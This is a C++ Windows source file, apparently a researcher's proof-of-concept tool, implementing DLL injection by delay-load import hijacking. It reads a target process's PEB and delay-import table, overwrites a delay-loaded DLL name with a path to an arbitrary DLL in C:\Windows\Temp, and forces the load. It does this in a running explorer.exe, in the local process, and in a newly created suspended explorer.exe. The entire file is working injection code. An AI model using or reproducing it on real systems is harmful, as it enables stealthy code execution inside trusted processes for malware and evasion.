// DelayLoadTester.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <Windows.h>
#include <WinDNS.h>
#include <Psapi.h>
#include <string>
#include <cfgmgr32.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <ShlDisp.h>

#pragma comment(lib, "Cfgmgr32.lib")
#pragma comment(lib, "Dnsapi.lib")
#pragma comment(lib, "ntdll")

void request_ejection();

#if _WIN64
#define PEB_OFFSET 0x10
#else
#define PEB_OFFSET 0x08
#endif

using namespace std;

void
request_ejection()
{
	HRESULT hResult = S_FALSE;
	IShellDispatch *pIShellDispatch = NULL;

	CoInitialize(NULL);

	hResult = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pIShellDispatch);
	if (SUCCEEDED(hResult))
	{
		printf("[+] Requesting ejection...\n");
		pIShellDispatch->EjectPC();
		pIShellDispatch->Release();
	}
	else{
		printf("[-] Failed!\n");
	}

	CoUninitialize();
}

SIZE_T
findBaseAddr(HANDLE hProcess)
{
	PEB *peb;
	SIZE_T dwReadBytes = 0, dwImageBase = 0;
	PROCESS_BASIC_INFORMATION info;
	LPVOID lpBuf = (LPVOID)malloc(sizeof(SIZE_T));

	printf("[+] Fetching PEB...\n");
	NTSTATUS status = NtQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&info,
		sizeof(info),
		0);

	if (!NT_SUCCESS(status))
	{
		printf("[-] Failed to call NtQueryInformationProcess: %08x\n", status);
		return 0;
	}

	peb = info.PebBaseAddress;
	printf("[+] PEB @ %08x\n", peb);

	// read base address
	if (!ReadProcessMemory(hProcess,
		(LPCVOID)((SIZE_T)peb + PEB_OFFSET),
		lpBuf,
		sizeof(SIZE_T),
		&dwReadBytes))
		printf("[-] %d\n", GetLastError());

	printf("[+] ImageBaseAddress: %08x\n", *(SIZE_T*)lpBuf);
	dwImageBase = *(SIZE_T*)lpBuf;

	return dwImageBase;
}

/*
 Fetch delay entry address for remote process
*/
IMAGE_DELAYLOAD_DESCRIPTOR*
findDelayEntry(HANDLE hProcess, char *cDllName)
{
	BYTE *bBuf = new BYTE[0x2000];
	SIZE_T dwReadBytes = 0, dwImageBase = 0;
	
	PIMAGE_DOS_HEADER pImgDos;
	IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult;

	dwImageBase = findBaseAddr(hProcess);

	// read image
	if (!ReadProcessMemory(hProcess, (LPCVOID)dwImageBase, bBuf, 0x2000, &dwReadBytes)){
		printf("[-] Couldnt read process image: %d\n", GetLastError());
	}

	pImgDos = (PIMAGE_DOS_HEADER)bBuf;

	PLOADED_IMAGE liLoaded = new LOADED_IMAGE();
	liLoaded->FileHeader = (PIMAGE_NT_HEADERS)(bBuf + pImgDos->e_lfanew);
	liLoaded->NumberOfSections = liLoaded->FileHeader->FileHeader.NumberOfSections;
	liLoaded->Sections = (PIMAGE_SECTION_HEADER)(bBuf + pImgDos->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	
	IMAGE_DATA_DIRECTORY iddDelayTable = liLoaded->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
	PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = new IMAGE_DELAYLOAD_DESCRIPTOR[iddDelayTable.Size / sizeof(IMAGE_DELAYLOAD_DESCRIPTOR)];

	// read out the delay load table
	if (!ReadProcessMemory(hProcess,
		(LPCVOID)(dwImageBase + liLoaded->FileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress),
		pImgDelay,
		iddDelayTable.Size,
		&dwReadBytes)){
		printf("[-] Failed to read delay table: %08x\n", GetLastError());
	}

	// now read each entry until we find our DLL
	for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry->ImportAddressTableRVA != NULL; entry++){
		
		char _cDllName[MAX_PATH];
		if (!ReadProcessMemory(hProcess,
			(LPCVOID)(dwImageBase + entry->DllNameRVA),
			_cDllName,
			MAX_PATH,
			&dwReadBytes)){
			printf("[-] Failed to read DLL name: %d\n", GetLastError());
		}

		if (strcmp(_cDllName, cDllName) == 0){
			pImgResult = entry;
			break;
		}

		ZeroMemory(cDllName, MAX_PATH);
	}
	
	return pImgResult;
}

/*
 Fetch delay entry address for local process
*/
IMAGE_DELAYLOAD_DESCRIPTOR*
findDelayEntry(char *cDllName)
{
	PIMAGE_DOS_HEADER pImgDos = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
	PIMAGE_NT_HEADERS pImgNt = (PIMAGE_NT_HEADERS)((LPBYTE)pImgDos + pImgDos->e_lfanew);
	PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelay = (PIMAGE_DELAYLOAD_DESCRIPTOR)((LPBYTE)pImgDos + pImgNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].VirtualAddress);
	SIZE_T dwBaseAddr = (SIZE_T)GetModuleHandle(NULL);
	IMAGE_DELAYLOAD_DESCRIPTOR *pImgResult = NULL;

	// iterate over entries 
	for (IMAGE_DELAYLOAD_DESCRIPTOR* entry = pImgDelay; entry->ImportAddressTableRVA != NULL; entry++){
		char *_cDllName = (char*)(dwBaseAddr + entry->DllNameRVA);
		if (strcmp(_cDllName, cDllName) == 0){
			pImgResult = entry;
			break;
		}
	}

	return pImgResult;
}

void
inject_explorer(DWORD pid)
{
	HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	SIZE_T dwBaseAddr, dwWroteBytes;
	DWORD dwOldProtect;
	LPCSTR ndll = "C:\\Windows\\Temp\\TestDLL.dll\0";

	PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelayEntry = findDelayEntry(hExplorer, "CFGMGR32.dll");
	dwBaseAddr = findBaseAddr(hExplorer);

	// mark it writable
	VirtualProtectEx(hExplorer, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), sizeof(SIZE_T), PAGE_READWRITE, &dwOldProtect);

	// overwrite with our DLL
	WriteProcessMemory(hExplorer, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), (LPVOID)ndll, strlen(ndll) + 1, &dwWroteBytes);

	// reset prot
	VirtualProtectEx(hExplorer, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), sizeof(SIZE_T), dwOldProtect, &dwOldProtect);

	request_ejection();
}

void
inject_local()
{
	PHANDLE phContext;
	SIZE_T dwWroteBytes;
	DWORD dwOldProtect;
	LPCSTR ndll = "C:\\Windows\\Temp\\TestDLL.dll\0";
	IMAGE_DELAYLOAD_DESCRIPTOR *pImgDelayEntry = findDelayEntry("DNSAPI.dll");
	SIZE_T dwEntryAddr = (SIZE_T)((SIZE_T)GetModuleHandle(NULL) + pImgDelayEntry->DllNameRVA);

	// mark it writable
	VirtualProtect((LPVOID)dwEntryAddr, sizeof(SIZE_T), PAGE_READWRITE, &dwOldProtect);

	// overwrite with our DLL
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwEntryAddr, (LPVOID)ndll, strlen(ndll), &dwWroteBytes);

	VirtualProtect((LPVOID)dwEntryAddr, sizeof(SIZE_T), dwOldProtect, &dwOldProtect);
	DnsAcquireContextHandle(FALSE, NULL, phContext);
}

void
inject_suspended()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPCSTR ndll = "C:\\Windows\\Temp\\TestDLL.dll\0";
	PROCESS_BASIC_INFORMATION info;
	PIMAGE_DELAYLOAD_DESCRIPTOR pImgDelayEntry;
	SIZE_T dwBaseAddr, dwWroteBytes;
	DWORD dwOldProtect;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// create suspended process Explorer.exe
	CreateProcess(L"C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	pImgDelayEntry = findDelayEntry(pi.hProcess, "WINSTA.dll");
	dwBaseAddr = findBaseAddr(pi.hProcess);

	// mark it writable
	VirtualProtectEx(pi.hProcess, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), sizeof(SIZE_T), PAGE_READWRITE, &dwOldProtect);

	// overwrite with our DLL
	WriteProcessMemory(pi.hProcess, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), (LPVOID)ndll, strlen(ndll) + 1, &dwWroteBytes);

	// reset prot
	VirtualProtectEx(pi.hProcess, (LPVOID)(dwBaseAddr + pImgDelayEntry->DllNameRVA), sizeof(SIZE_T), dwOldProtect, &dwOldProtect);

	ResumeThread(pi.hThread);
}

int _tmain(int argc, _TCHAR* argv[])
{
	//inject_local();
	//inject_suspended();
	inject_explorer(_wtoi(argv[1]));

	return 0;
}